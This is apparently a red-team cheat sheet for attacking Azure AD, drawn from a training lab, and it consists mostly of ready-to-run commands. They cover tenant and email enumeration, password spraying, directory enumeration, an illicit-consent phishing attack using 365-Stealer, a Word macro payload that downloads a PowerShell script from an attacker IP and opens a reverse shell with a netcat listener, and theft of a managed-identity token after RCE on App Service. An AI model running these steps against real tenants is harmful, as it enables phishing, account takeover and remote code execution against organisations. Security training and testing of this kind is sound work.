# Azure AD

## Recon

### Tenant

```powershell
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName admin@defcorphq.onmicrosoft.com
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
```

#### More info

```powershell
# Valid emails
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
# Enumerate Subdomains
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

#### Password Spraying

```powershell
. C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password 'password' -Verbose
```

### MG Module

#### Login

```powershell
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
```

#### Enumerate

```powershell
# Users
Get-MgUser -All
Get-MgUser -All | select UserPrincipalName
# Groups
Get-MgGroup -All
# Devices
Get-MgDevice
# Get Global Administrators
$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
(Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties
# List Custom Directory Roles
Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName
```

### Az Powershell

#### Login

```powershell
```powershell
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
```

#### Recon

```powershell
# List all resources
Get-AzResource
# List the role assigment 
Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com
# List vms
Get-AzVM | fl
# List app services
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
# List Function Apps
Get-AzFunctionApp
# List storage accounts
Get-AzStorageAccount | fl
# List readable key vaults
Get-AzKeyVault
```

### az cli

```powershell
# Login
az login -u test@defcorphq.onmicrosoft.com -p password
# List vms
az vm list 
az vm list --query "[].[name]" -o table
# List webapps
az webapp list
az webapp list --query "[].[name]" -o table
# List functiona pps
az functionapp list --query "[].[name]" -o table
# List storage
az storage account list
# List key vault
az keyvault list
```

### StormSPotter

- https://github.com/Azure/Stormspotter

```bash
az login -u test@defcorphq.onmicrosoft.com -p password
python sscollector.pyz cli
```

### Bloodhound (de toda la vida)

```powershell
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```


## Exploitation

### Illicit Consent Grant Attack

- https://www.alteredsecurity.com/post/introduction-to-365-stealer
- https://github.com/trouble-1/vajra

We need:

1. External Tenant
2. In cases (Admin consent)

Steps:

1. Create an application `(Multitenant, web, Redirect to our ip server - https://ip/login/authorized)`
2. Copy the Application (client) ID
3. Generate secret and save value
4. Go to API Permissions and add Delegated Permissions MS Graph (read,files,etc)
5. Launch 365 steeler and set config
6. Send phishing link to victim
7. If you have read,write permissions to Onedrive you can upload a reverse shell into word document

```powershell
# RCE Macro doc
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.x:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.x -Port 4444" -OutputFile studentx.doc
C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
```

```bash
# Also you can set on webapp
python 365-Stealer.py --set-config
python 365-Stealer.py --run-app
```

### Azure App Service

> We need rce to access to management identity with the header and request a token

Could be these vulnerabilities:

1. File Upload Vulnerability
2. SSTI
3. RCE

```powershell
env
# Get Token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

With the token you can enumerate the permissions but by default Azure not show that 

```powershell
$Token =  'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value 
```

```powershell

```

## References

- https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
- https://blog.netwrix.com/2023/05/13/pass-the-prt-overview/
- https://aadinternals.com/post/prt/
- https://github.com/morRubin/PrtToCert
- https://github.com/morRubin/AzureADJoinedMachinePTC